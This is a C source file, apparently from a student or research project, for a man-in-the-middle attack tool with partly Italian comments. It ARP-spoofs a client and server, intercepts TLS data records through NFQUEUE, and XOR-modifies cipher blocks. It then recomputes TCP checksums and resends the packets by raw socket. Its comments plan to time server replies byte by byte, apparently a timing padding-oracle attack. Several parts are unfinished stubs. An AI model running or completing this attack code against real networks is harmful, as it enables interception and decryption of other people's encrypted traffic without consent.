#define _GNU_SOURCE
#include "../include/utility.h"
#include "../include/network.h"
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <time.h>
#include <linux/netfilter.h>
#include <pcap.h>
#include <libnetfilter_queue/libnetfilter_queue.h>

void extract_mode();
void extract_network_config();

// network
void setup_nfq(struct nfq_handle **h, struct nfq_q_handle **qh);
void intercept_packets();
static inline struct iphdr *extract_ip_header(Byte *payload, unsigned int payload_len);
static inline struct tcphdr *extract_tcp_header(Byte *payload, unsigned int payload_len, unsigned int iphdr_len);
static inline Byte *extract_application_data(Byte *payload, unsigned int payload_len, unsigned int iphdr_size, unsigned int tcphdr_size);

void *do_attack_thread(void *arg);

Data_packet *data_packet;
pthread_cond_t attack_thread_cond = PTHREAD_COND_INITIALIZER;
pthread_mutex_t attack_thread_mutex = PTHREAD_MUTEX_INITIALIZER;
bool attack;
Byte *cookie; //define the large with thre realloc function

#define DIM_PAGE 4096

char my_ip[INET_ADDRSTRLEN];
char gateway_ip[INET_ADDRSTRLEN];
char ip_client[INET_ADDRSTRLEN];
char ip_server[INET_ADDRSTRLEN];
//char *ip_client = "127.0.0.1"; 
//char *ip_server = "127.0.0.1";
int port_server = 5000;
char network_config;
char op_mode;

static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data);

int main(int argc, char *argv[]) {

  pthread_t attack_thread;
  attack = false;
 

  if (argc < 3) {
    perror("Missing arguments! \n");
    return 0;
  }

  // -d (creazione dstaset), -a (attaccante vero e proprio)
  if(argv[1][0] == '-'){
    op_mode = argv[1][1];
  }

  /*
  switch(op_mode) {
    case 'd':
      printf("Dataset creation mode selected! \n");
      break;
    case 'a':
      printf("Attack mode selected! \n");
      break;
    default:
      perror("Invalid operation mode! \n");
      exit(EXIT_FAILURE);
  }*/

  // -l --> LocalHost
  // -n --> client and server in the same NETWORK
  // -i --> client in the same LAN and server outside
  if(argv[2][0] == '-'){
    network_config = argv[2][1];
  }

  data_packet = (Data_packet *)malloc(sizeof(Data_packet));
  if(!data_packet){
    perror("Error allocating memory for data_packet! \n");
    exit(EXIT_FAILURE);
  }
  
  printf("Operation mode: %c. Network config: %c \n", op_mode, network_config);

  //extract_network_config(); 
  catch_signals();

  pthread_create(&attack_thread, NULL, do_attack_thread, NULL);
  //variabili condizionali per sleep e risveglio del thread

  // selecting the operation mode
  switch(network_config){
    case 'l':
      strncpy(ip_client, "127.0.0.1", INET_ADDRSTRLEN);
      strncpy(ip_server, "127.0.0.1", INET_ADDRSTRLEN);
      printf("LocalHost network configuration selected \n");
      break;
    case 'n':
      get_network_info(my_ip, gateway_ip);
      //extract ip client by the passed arguments
      if(argc < 5){
        perror("Missing arguments!");
        exit(EXIT_FAILURE);
      }
      strncpy(ip_client, argv[3], INET_ADDRSTRLEN);
      strncpy(ip_server, argv[4], INET_ADDRSTRLEN);
      printf("LAN network configuration selected \n");
      arp_spoofing(ip_client, ip_server);
      arp_spoofing(ip_server, ip_client);
      break;
    case 'i':
      if(argc < 4){
        perror("Missing arguments!");
        exit(EXIT_FAILURE);
      }
      printf("Internet network configuration selected \n");
      break;
    default:
      fprintf(stderr, "Invalid netowkr configuration flag! \n");
  }

  printf("Mio indirizzo ip: %s \n indirizzo ip default gateway: %s \n", my_ip, gateway_ip);

  printf("Starting MITM proxy \n");

  setup_network_interception();
  intercept_packets();

  return 0;
}

//function to extrract the network configuration by network configuration parameter
void extract_network_config() {

  switch (network_config) {
  case 'l':
    strncpy(ip_client, "127.0.0.1", INET_ADDRSTRLEN);
    strncpy(ip_server, "127.0.0.1", INET_ADDRSTRLEN);
    printf("LocalHost network configuration selected \n");
    break;
  case 'n':
    get_network_info(my_ip, gateway_ip);
    
    printf("LAN network configuration selected \n");
    break;
  case 'i':
    printf("Internet network configuration selected \n");
    break;
  default:
    fprintf(stderr, "Invalid netowkr configuration flag! \n");
  }
}

//function to initialize nfq (NFQUEUE)
void setup_nfq(struct nfq_handle **h, struct nfq_q_handle **qh){

  *h = nfq_open();

  if(!(*h)){
    perror("Error in the NFQUEUE opening! \n");
    exit(EXIT_FAILURE);
  }

  *qh = nfq_create_queue(*h, 0, &packet_verdict_handler, NULL);

  if(!(*qh)){
    perror("Error in the NFQUEUE creation! \n");
    exit(EXIT_FAILURE);
  }

  if(nfq_set_mode(*qh, NFQNL_COPY_PACKET, 0xffff) < 0){
    perror("Error in the NFQUEUE mode setting! \n");
    exit(EXIT_FAILURE);
  }

}

//forse da spostare in network.c
void intercept_packets() {

  struct nfq_handle *h;
  struct nfq_q_handle *qh;
  int fd;
  int rcv;
  char buffer[DIM_PAGE] __attribute__((aligned));

  setup_nfq(&h, &qh);

  fd = nfq_fd(h);

  do{
    rcv = recv(fd, buffer, sizeof(buffer), 0);
    if(rcv > 0){
      nfq_handle_packet(h, buffer, rcv);
    }
  }while(rcv > 0);

}

//function to determinate the sort of a packet
static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data){

  struct nfqnl_msg_packet_hdr *ph; 
  Byte *payload;
  unsigned int payload_len;
  uint32_t id;
  struct iphdr *ip_header;
  unsigned int iphdr_size;
  struct tcphdr *tcp_header;
  unsigned int tcphdr_size;
  Byte *application_payload;
  unsigned int application_payload_size;

  ph = nfq_get_msg_packet_hdr(nfa);
  id = ntohl(ph->packet_id);

  payload_len = nfq_get_payload(nfa, &payload);
  printf("Packet data: ID=%u, %d bytes \n", id, payload_len);

  ip_header = extract_ip_header(payload, payload_len);
  iphdr_size = ip_header->ihl << 2; 

  if(ip_header->protocol == IPPROTO_TCP){
    tcp_header = extract_tcp_header(payload, payload_len, iphdr_size);
    printf("TCP packet detected! Source port: %d, Destination port: %d \n", ntohs(tcp_header->source), ntohs(tcp_header->dest));
    tcphdr_size = tcp_header->doff << 2;

    application_payload = extract_application_data(payload, payload_len, iphdr_size, tcphdr_size);
    application_payload_size = payload_len - iphdr_size - tcphdr_size;

    //SSL/TLS handshake message
    if(application_payload != NULL &&application_payload[0] == 0x16 && application_payload[1] == 0x03 && (application_payload[2] == 0x01 || application_payload[2] == 0x02 || application_payload[2] == 0x03)){
      printf(ANSI_COLOR_GREEN "SSL/TLS handshake packet detected! \n" ANSI_COLOR_RESET);
      return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }

    //SSL/TLS data message
    if(application_payload != NULL && application_payload[0] == 0x17 && application_payload[1] == 0x03 && (application_payload[2] == 0x01 || application_payload[2] == 0x02 || application_payload[2] == 0x03)){
      printf(ANSI_COLOR_BLUE "SSL/TLS data packet detected! \n" ANSI_COLOR_RESET);
      if(application_payload_size > 0){
        printf("Printing of the data \n");
        print_application_data(application_payload, application_payload_size);

        if(check_data_length(application_payload, application_payload_size) == false){
          fprintf(stderr, "Data length is not correct! \n");
          return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
        }

        //ALLOCAZIONE ED INIZIALIZZAZIONE DEL PACCHETTO DATA_LENGTH (VARIABILE GLOBALE) E DEI SUOI CAMPI (IP HEADER, TCP HEADER, APPLICATION DATA)
        //allocate memory for the packet
        data_packet->packet = (unsigned char *)malloc(payload_len * sizeof(unsigned char));
        if(!data_packet->packet){
          perror("Error allocating memory for data_packet->packet! \n");
          exit(EXIT_FAILURE);
        }
        memcpy(data_packet->packet, payload, payload_len);
        data_packet->len = payload_len;//i need to pass the entire packet to calculate the new checksum
        
        //allocate memory for the ip_header
        data_packet->ip_header = (struct iphdr *)malloc(sizeof(struct iphdr));
        if(!data_packet->ip_header){
          perror("Error allocating memory for data_packet->ip_header! \n");
          exit(EXIT_FAILURE);
        }
        memcpy(data_packet->ip_header, ip_header, sizeof(struct iphdr));
        data_packet->ip_header_len = iphdr_size;

        //allocate memory for the tcp_header
        data_packet->tcp_header = (struct tcphdr *)malloc(sizeof(struct tcphdr));
        if(!data_packet->tcp_header){
          perror("Error allocating memory for data_packet->tcp_header! \n");
          exit(EXIT_FAILURE);
        }
        memcpy(data_packet->tcp_header, tcp_header, sizeof(struct tcphdr));
        data_packet->tcp_header_len = tcphdr_size;

        //allocate memory for the application data
        data_packet->data = (unsigned char *)malloc(application_payload_size * sizeof(unsigned char));
        if(!data_packet->data){
          perror("Error allocating memory for data_packet->data! \n");
          exit(EXIT_FAILURE);
        }
        memcpy(data_packet->data, application_payload, application_payload_size);
        data_packet->data_len = application_payload_size;

        attack = true;
        pthread_cond_signal(&attack_thread_cond);
      }
      //sveglio il thread che modifica il pacchetto, ricalcola la checksum, lo invia al server, avvia il timer, attende risposta server, all'arrivo stoppa il timer ed inoltra il pacchetto al client

      //drop packet
      return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
    }
  } 

  return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
}

//function to extract the IP header from the packet payload
static inline struct iphdr *extract_ip_header(Byte *payload, unsigned int payload_len){
  struct iphdr *ip_header;
  if(payload_len < sizeof(struct iphdr)){
    fprintf(stderr, "Payload too small to contain an IP header! \n");
    return NULL;
  }
  ip_header = ((struct iphdr *)payload);

  return ip_header;
}

//function to extract the TCP header from the packet payload
static inline struct tcphdr *extract_tcp_header(Byte *payload, unsigned int payload_len, unsigned int iphdr_len){
  struct tcphdr *tcp_header;
  if(payload_len < (iphdr_len + sizeof(struct tcphdr))){
    fprintf(stderr, "Payload too small to contain a TCP header! \n");
    return NULL;
  }
  tcp_header = ((struct tcphdr *)(payload + iphdr_len));

  return tcp_header;
}

//function to extract the application data from the packet payload
static inline Byte *extract_application_data(Byte *payload, unsigned int payload_len, unsigned int iphdr_size, unsigned int tcphdr_size){
  Byte *application_data;
  if((payload_len <= (iphdr_size + tcphdr_size))){
    fprintf(stderr, "Payload too small to contain application data! \n");
    return NULL;
  }

  application_data = ((char *)payload + iphdr_size + tcphdr_size);
  return application_data;
}

//0 -> ssl handshake, 1 --> ssl/tls data packet, 
int analyze_application_data(Byte *payload, int payload_len){

}

/*
  devo tenere traccia di che byte utilizzare e di quale byte modificare
  es: byte 0x00 in ultima pos, poi 0x01, poi 0x02, ecc... fino a 0xff, poi ricomincio da 0x01
  (il byte che ha il minore tempo diu risposta è quello corretto)
*/

//function to modify the packet
void modify_packet(int block_pos, int byte_pos){

  //tutta la parte di creazione della maschera e xor va poi messa in una apposita funzione
  Byte *prec_block = data_packet->data;
  
  Byte *bytes_to_add = NULL;


  Byte *mask = (Byte *)malloc(sizeof(Byte) * data_packet->data_len);
  //memset(mask, 0x00 , pos_byte);
  int i;
  int num_block = 0;

  //i primi 5 byte della maschera, relativi all'intestazione di tls data, devono essere tutti a 0
  mask = make_mask(block_pos, byte_pos, data_packet);

  Byte *mask_first_bytes = (Byte *) malloc(sizeof(Byte) * data_packet->data_len);
  mask_first_bytes = make_mask_first_bytes(block_pos, data_packet);
 
  //xor tra maschera e pacchetto originale
  Byte *modified_packet = xor_block(prec_block, mask, data_packet->data_len);
  Byte *modified_first_bytes = xor_block(prec_block, mask_first_bytes, data_packet->data_len);

  print_blocks(modified_packet, data_packet->data_len);

  printf(" \n Stampa del'header dopo maschera! \n");
  print_tls_header(modified_first_bytes);

  printf("\n stampa del pacchetto dopo maschera first bytes!  \n");
  print_blocks(modified_first_bytes, data_packet->data_len);

  data_packet->data = modified_first_bytes;
}

//TROVARE UNA SOLUZIONE MIGLIORE ALLA GESTIONE DEL -5 SULLA GRANDEZZA DEL PACCHETTO DATA

//function to recalculate the TCP checksum (provare dopo a spostarla in utility.c passando come paramento const Data_packet **)
unsigned short recalculate_checksum(){

  unsigned long sum = 0;
  unsigned short checksum = 0;
  uint16_t tcp_total_len = data_packet->tcp_header_len + data_packet->data_len;

  //create the Ip Pseudo Header
  sum += (data_packet->ip_header->saddr >> 16) & 0xFFFF;
  sum += (data_packet->ip_header->saddr) & 0xFFFF;
  sum += (data_packet->ip_header->daddr >> 16) & 0xFFFF;
  sum += (data_packet->ip_header->daddr) & 0xFFFF;
  sum += htons(tcp_total_len) & 0xFFFF;
  sum += htons(IPPROTO_TCP) & 0xFFFF;

  //__be16 is like unsigned short but tells us that is in network byte order (we don't need htons())

  unsigned short *ptr = (unsigned short *)data_packet->tcp_header;
  int byte_left = ((int)(data_packet->tcp_header_len));

  data_packet->tcp_header->check = 0;
  while(byte_left > 1){
    sum += *ptr;
    ptr++;
    byte_left-=2;
  }

  if(byte_left == 1){ //we need padding
    sum += (0x0000 | *(unsigned char *)ptr) & 0xFFFF;
  }
  printf("%#lx\n",sum);

  ptr = ((unsigned short *)data_packet->data);
  byte_left = ((int)(data_packet->data_len));

  while(byte_left > 1){
    sum += *ptr;
    ptr++;
    byte_left-=2;
  }

  if(byte_left == 1){ //we need padding
    sum += (0x0000 | *(unsigned char *)ptr) & 0xFFFF;
  }
  printf("%#lx\n",sum);

  
  while (sum >> 16) {
    sum = (sum & 0xFFFF) + (sum >> 16);
  } 
  
  /*
  do{
    sum = ((sum & 0xFFFF) + (sum >> 16) & 0xFFFF);
  }while((sum >> 16) != 0);  */
  
  printf("Sono alla fine del ciclo! \n");
  checksum = ~sum & 0xFFFF;
  
  return checksum;
}

//function to send the modified packet to the server
void send_modified_packet(){

  //mettere la struct come tutti dati contigui
  int smp_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_RAW);
  char *raw_packet;

  restore_network_default();
  
  unsigned int total_packet_length = data_packet->ip_header_len + data_packet->tcp_header_len + data_packet->data_len;
  raw_packet = (char *) malloc(total_packet_length);

  memcpy(raw_packet, data_packet->ip_header, data_packet->ip_header_len);
  memcpy(raw_packet + data_packet->ip_header_len, data_packet->tcp_header, data_packet->tcp_header_len);
  memcpy(raw_packet + data_packet->ip_header_len + data_packet->tcp_header_len, data_packet->data, data_packet->data_len);

  struct sockaddr_in server_addr;
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = data_packet->ip_header->daddr;
  server_addr.sin_port = data_packet->tcp_header->dest;

  printf("ho creato l'indirizzo ora spedisco il pacchetto al server! \n");

  sendto(smp_fd, raw_packet, total_packet_length,0, (struct sockaddr *)&server_addr, sizeof(server_addr));

  printf("pacchetto mandato al server! \n");

  free(raw_packet);
  close(smp_fd);
}

void wait_server_reply(){




}

//thread function to perform attack
void *do_attack_thread(void *arg){

  struct timespec start, stop;

  unsigned short checksum;
  while(1==1){
    while(attack == false){
      //pthread_mutex_lock(&attack_thread_mutex);
      pthread_cond_wait(&attack_thread_cond, &attack_thread_mutex);
      //pthread_mutex_unlock(&attack_thread_mutex);
    } 
    printf("Secondo thread avviato\n");
    /*
    printf("------Packet------ \n");
    print_application_data(data_packet->data, data_packet->data_len); */

    printf("- - - - - - -  - - - - - - BLOCCHI - - - -  - - - - -  - - - - - ");
    //capire come devo modificare il pacchetto e come tenere traccia della posizione del byte da modificare e con quale valore modificarlo
    print_data_blocks(data_packet->data, data_packet->data_len);
    
    modify_packet(4,14);

    printf("STAMPA NEL THREAD DEL PACCHETTO MODIFICATO \n");

    print_data_blocks(data_packet->data, data_packet->data_len);

    printf("Recalculate checksum! \n");

    checksum = recalculate_checksum();

    data_packet->tcp_header->check = checksum;

    printf("Checksum: %04x \n", checksum);

   
    send_modified_packet();
    //clock_gettime(CLOCK_MONOTONIC, &start);


    //attendo la ricezione del pacchetto


    //clock_gettime(CLOCK_REALTIME, &stop);

    //start_timer(); (forse chiamata subito dentro send_modified_packet)
    //wait for response
    //stop_timer();
    //write result to csv file
    attack = false;
  }

}



